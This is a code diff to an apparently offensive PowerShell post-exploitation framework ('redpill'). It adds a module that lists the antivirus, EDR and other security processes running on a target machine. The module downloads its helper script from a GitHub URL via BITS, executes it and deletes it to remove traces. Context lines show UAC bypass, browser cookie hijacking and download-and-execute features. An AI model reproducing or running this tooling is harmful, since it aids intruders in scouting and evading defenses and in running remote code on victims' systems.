@@ -91,6 +91,7 @@
    [string]$Dicionary="$Env:TMP\passwords.txt",
    [string]$Uri="$env:TMP\SpawnPowershell.cs",
    [string]$OutFile="$Env:TMP\Installer.exe",
+   [string]$GetCounterMeasures="false",
    [string]$Domain="www.facebook.com",
    [string]$ServiceName="WinDefend",
    [string]$CookieHijack="False",
@@ -214,6 +215,7 @@ $ListParameters = @"
   -CsOnTheFly       https://../script.cs     Download\Compile (to exe) and exec CS scripts
   -CookieHijack     Dump|History             Edge|Chrome browser Cookie Hijacking tool
   -UacMe            Bypass|Elevate|Clean     UAC bypass|EOP by dll reflection! (cmstp.exe)
+  -GetCounterMeasures Enum|verbose           List common security processes\pid's running!
 
 "@;
 echo $ListParameters > $Env:TMP\mytable.mt
@@ -266,7 +268,7 @@ If($Sysinfo -ieq "Enum" -or $Sysinfo -ieq "Verbose"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1 -Destination $Env:TMP\Sysinfo.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\Sysinfo.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 21){## Corrupted download detected => DefaultFileSize: 21,177734375/KB
+      If($SizeDump -lt 21){## Corrupted download detected => DefaultFileSize: 21,248046875/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\Sysinfo.ps1"){Remove-Item -Path "$Env:TMP\Sysinfo.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -3103,6 +3105,75 @@ If($LiveStream -ne "false"){
 }
 
 
+If($GetCounterMeasures -ne "false"){
+
+   <#
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Helper - List common security processes running!
+
+   .DESCRIPTION
+      This cmdlet enumerates common security product processes running
+      on target system, By exec 'Get-Process' powershell cmdlet {native}
+      to retrieve process 'product name', 'process name' and 'process pid'
+
+   .NOTES
+      This cmdlet is an aux module of @redpill -sysinfo 'verbose'
+      Currentlly this cmdlet query for the most common AV processes,
+      AppWhitelisting, Behavioral Analysis, Intrusion Detection, DLP.
+
+   .Parameter Action
+      Accepts arguments: Enum, Verbose (default: Enum)
+
+   .EXAMPLE
+      PS C:\> Get-Help .\GetCounterMeasures.ps1 -full
+      Access this cmdlet comment based help
+
+   .EXAMPLE
+      PS C:\> powershell -file GetCounterMeasures.ps1
+      List common security product processes running!
+
+   .EXAMPLE
+      PS C:\> powershell -file GetCounterMeasures.ps1 -Action Verbose
+      List common security product processes names, AppWhitelisting,
+      Behavioral Analysis, EDR, DLP, Intrusion Detection, Firewall, HIPS.
+
+   .OUTPUTS
+      Common security processes running!
+      ----------------------------------
+      Product      : Windows Defender AV
+      Description  : Anti-Virus
+      ProcessName  : MsMpEng
+      Pid          : 3516
+
+      Product      : CrowdStrike Falcon EDR
+      Description  : Behavioral Analysis
+      ProcessName  : CSFalcon
+      Pid          : 8945
+   #>
+
+   ## Download GetCounterMeasures.ps1 from my GitHub
+   If(-not(Test-Path -Path "$Env:TMP\GetCounterMeasures.ps1")){## Download GetCounterMeasures.ps1 from my GitHub repository
+      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetCounterMeasures.ps1 -Destination $Env:TMP\GetCounterMeasures.ps1 -ErrorAction SilentlyContinue|Out-Null
+      ## Check downloaded file integrity => FileSizeKBytes
+      $SizeDump = ((Get-Item -Path "$Env:TMP\GetCounterMeasures.ps1" -EA SilentlyContinue).length/1KB)
+      If($SizeDump -lt 18){## Corrupted download detected => DefaultFileSize: 18,611328125/KB
+         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
+         If(Test-Path -Path "$Env:TMP\GetCounterMeasures.ps1"){Remove-Item -Path "$Env:TMP\GetCounterMeasures.ps1" -Force}
+         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
+      }   
+   }
+
+   ## Run auxiliary module
+   If($GetCounterMeasures -ieq "false"){$GetCounterMeasures = "Verbose"}
+   powershell -File "$Env:TMP\GetCounterMeasures.ps1" -Action "$GetCounterMeasures"
+
+   ## Clean Artifacts left behind
+   If(Test-Path -Path "$Env:TMP\GetCounterMeasures.ps1"){Remove-Item -Path "$Env:TMP\GetCounterMeasures.ps1" -Force}
+}
+
+
+
 ## --------------------------------------------------------------
 ##       HELP =>  * PARAMETERS DETAILED DESCRIPTION *
 ## --------------------------------------------------------------
@@ -4941,6 +5012,51 @@ $HelpParameters = @"
 
    .LINK
       https://www.labofapenetrationtester.com/2015/12/stream-targets-desktop-using-mjpeg-and-powershell.html
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "GetCounterMeasures"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Helper - List common security processes running!
+
+   .DESCRIPTION
+      This cmdlet enumerates common security product processes running
+      on target system, By exec 'Get-Process' powershell cmdlet {native}
+      to retrieve process 'product name', 'process name' and 'process pid'
+
+   .NOTES
+      Currentlly this cmdlet query for the most common AV processes,
+      AppWhitelisting, Behavioral Analysis, Intrusion Detection, DLP.
+
+   .Parameter Action
+      Accepts arguments: Enum, Verbose (default: Enum)
+
+   .EXAMPLE
+      PS C:\> powershell -file redpill.ps1 -GetCounterMeasures Enum
+      List common security product processes\pid's running on target!
+
+   .EXAMPLE
+      PS C:\> powershell -file redpill.ps1 -GetCounterMeasures Verbose
+      List common security product processes names\pid's, AppWhitelisting,
+      Behavioral Analysis, EDR, DLP, Intrusion Detection, Firewall, HIPS.
+
+   .OUTPUTS
+      Common security processes running!
+      ----------------------------------
+      Product      : Windows Defender AV
+      Description  : Anti-Virus
+      ProcessName  : MsMpEng
+      Pid          : 3516
+
+      Product      : CrowdStrike Falcon EDR
+      Description  : Behavioral Analysis
+      ProcessName  : CSFalcon
+      Pid          : 8945
    #>!bye..
 
 "@;
